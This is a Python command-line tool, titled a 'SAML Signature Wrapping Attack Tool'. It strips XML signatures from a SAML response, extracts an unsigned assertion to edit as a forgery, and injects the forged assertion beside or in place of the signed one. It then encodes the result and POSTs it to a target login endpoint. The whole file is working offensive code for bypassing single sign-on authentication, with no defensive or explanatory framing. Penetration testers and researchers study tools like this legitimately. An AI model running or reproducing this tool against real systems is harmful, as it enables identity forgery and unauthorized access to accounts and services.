import argparse
import base64
import urllib.parse
import requests
import xml.etree.ElementTree as ET
from pathlib import Path
import sys

ET.register_namespace('saml', "urn:oasis:names:tc:SAML:2.0:assertion")
ET.register_namespace('samlp', "urn:oasis:names:tc:SAML:2.0:protocol")
ET.register_namespace('ds', "http://www.w3.org/2000/09/xmldsig#")


def parse_args():
    parser = argparse.ArgumentParser(description="SAML Signature Wrapping Attack Tool")

    parser.add_argument('--input', required=True, help='Input SAML XML file')
    parser.add_argument('--remove-signature', action='store_true', help='Remove all <ds:Signature> elements')
    parser.add_argument('--make-forged-template', help='Extract an unsigned assertion for editing')
    parser.add_argument('--inject-forged-assertion', help='Inject this assertion into the SAML Response')
    parser.add_argument('--assertion-mode', choices=['both', 'only-forged'], default='both',
                        help='Whether to keep both signed and forged assertions, or just forged')
    parser.add_argument('--output', help='Path to save modified XML')
    parser.add_argument('--out-encoded', help='Path to save encoded output')
    parser.add_argument('--encode', nargs='+', choices=['base64', 'url'], help='Order of encoding to apply')
    parser.add_argument('--post', help='POST to the given URL')
    parser.add_argument('--post-param', action='append', help='Additional POST key=value parameters')
    parser.add_argument('--relay', help='RelayState value')

    return parser.parse_args()


def remove_signatures(root):
    ns = {'ds': 'http://www.w3.org/2000/09/xmldsig#'}
    for sig in root.findall('.//ds:Signature', ns):
        parent = sig.getparent() if hasattr(sig, 'getparent') else None
        if parent is None:
            for assertion in root.findall('.//{urn:oasis:names:tc:SAML:2.0:assertion}Assertion'):
                assertion.remove(sig)
        else:
            parent.remove(sig)


def extract_forged_template(root, output_path):
    assertion = root.find('.//{urn:oasis:names:tc:SAML:2.0:assertion}Assertion')
    if assertion is None:
        print("No assertion found in input.")
        sys.exit(1)

    for sig in assertion.findall('{http://www.w3.org/2000/09/xmldsig#}Signature'):
        assertion.remove(sig)

    forged_tree = ET.ElementTree(assertion)
    forged_tree.write(output_path, encoding='utf-8', xml_declaration=True)
    print(f"Forged assertion template written to: {output_path}")


def inject_forged_assertion(root, forged_path, mode):
    forged_tree = ET.parse(forged_path)
    forged_assertion = forged_tree.getroot()

    all_assertions = root.findall('.//{urn:oasis:names:tc:SAML:2.0:assertion}Assertion')
    for a in all_assertions:
        root.remove(a)

    if mode == 'both':
        root.append(forged_assertion)
        for a in all_assertions:
            root.append(a)
    elif mode == 'only-forged':
        root.append(forged_assertion)


def encode_payload(xml_string, encode_order):
    data = xml_string.encode('utf-8')
    for method in encode_order:
        if method == 'base64':
            data = base64.b64encode(data)
        elif method == 'url':
            data = urllib.parse.quote_plus(data.decode()).encode()
    return data.decode()


def main():
    args = parse_args()

    tree = ET.parse(args.input)
    root = tree.getroot()

    if args.remove_signature:
        remove_signatures(root)

    if args.make_forged_template:
        extract_forged_template(root, args.make_forged_template)
        return

    if args.inject_forged_assertion:
        inject_forged_assertion(root, args.inject_forged_assertion, args.assertion_mode)

    # Save modified XML
    output_xml = ET.tostring(root, encoding='utf-8', method='xml')
    if args.output:
        Path(args.output).write_bytes(output_xml)
        print(f"Modified XML written to: {args.output}")

    # Encode
    if args.encode:
        encoded = encode_payload(output_xml.decode('utf-8'), args.encode)
        if args.out_encoded:
            Path(args.out_encoded).write_text(encoded)
            print(f"Encoded output written to: {args.out_encoded}")

    # POST if requested
    if args.post:
        post_data = {
            'SAMLResponse': encoded if args.encode else output_xml.decode('utf-8')
        }
        if args.relay:
            post_data['RelayState'] = args.relay
        if args.post_param:
            for param in args.post_param:
                k, v = param.split('=', 1)
                post_data[k] = v

        resp = requests.post(args.post, data=post_data)
        print(f"[+] Status: {resp.status_code}")
        print(resp.text)

if __name__ == '__main__':
    main()

